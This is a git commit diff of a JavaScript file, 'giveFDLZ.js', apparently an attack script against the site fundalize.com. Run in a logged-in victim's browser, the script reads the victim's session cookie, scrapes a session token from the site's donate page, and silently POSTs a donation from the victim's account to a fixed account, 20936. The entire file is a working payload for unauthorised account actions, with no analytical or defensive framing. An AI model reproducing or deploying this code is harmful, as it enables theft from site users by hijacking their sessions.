4f73187ffb74b6c75d322679d5239b9719dcbacf
kakunawim <kakunawim@gmail.com>
2020-02-09 03:56:32 +0100

    Update giveFDLZ.js

--- giveFDLZ.js
+++ giveFDLZ.js
@@ -1,29 +1,55 @@
 
-var xhttp = new XMLHttpRequest();
-xhttp.open('POST', 'http://fundalize.com/includes/ajax_useractions.php', true);
-var cookies = document.cookie;
-var SID = getCookie('intertet_cookie_sid');
-var params = 'uid=20936&pid='+user_id+'&amount=10&session='+SID+'&message=Met%20liefde%20gegeven%20<3&mode=donate';
-console.log('User ID: ' + user_id);
-console.log('SID: ' + SID);
+var xhttp2 = new XMLHttpRequest();
+var response;
+var SID;
 
-
-xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=UTF-8");
-//xhttp.setRequestHeader("Cookie", cookies);
-xhttp.send(params); 
-
-xhttp.onreadystatechange=(e)=>{
-	if (xhttp.readyState === XMLHttpRequest.DONE && xhttp.status === 200){
-		console.log('done');
+xhttp2.open('GET', 'http://www.fundalize.com/includes/pop_donate.php?&to=20936', true);
+xhttp2.onreadystatechange=(e)=>{
+	if (xhttp2.readyState === XMLHttpRequest.DONE && xhttp2.status === 200){
+		response = xhttp2.response;
+		getSID();
+		step2();
 	}
 	else{
-		console.log('fail');
+		console.log('GET failed');
 	}
 }
+xhttp2.send('');
 
+function getSID(){
+	var position = response.search(".value") + 8;
+	var endposition = response.search("',document");
+	SID = response.substring(position, endposition);
+}
+
+
+function step2(){
+	var xhttp = new XMLHttpRequest();
+	xhttp.open('POST', 'http://fundalize.com/includes/ajax_useractions.php', true);
+	var cookies = document.cookie;
+	var SID = getCookie('intertet_cookie_sid');
+	var params = 'uid=20936&pid='+user_id+'&amount=10&session='+SID+'&message=Met%20liefde%20gegeven%20<3&mode=donate';
+	console.log('User ID: ' + user_id);
+	console.log('SID: ' + SID);
+	
+	
+	xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=UTF-8");
+	//xhttp.setRequestHeader("Cookie", cookies);
+	xhttp.send(params); 
+	
+	xhttp.onreadystatechange=(e)=>{
+		if (xhttp.readyState === XMLHttpRequest.DONE && xhttp.status === 200){
+			console.log('done');
+		}
+		else{
+			console.log('fail');
+		}
+	}
+}
 function getCookie(cname) {
 var name = cname + "=";
-var decodedCookie = decodeURIComponent(document.cookie);
+//var decodedCookie = decodeURIComponent(document.cookie);
+var decodedCookie = document.cookie;
 var ca = decodedCookie.split(';');
 for(var i = 0; i <ca.length; i++) {
 	var c = ca[i];
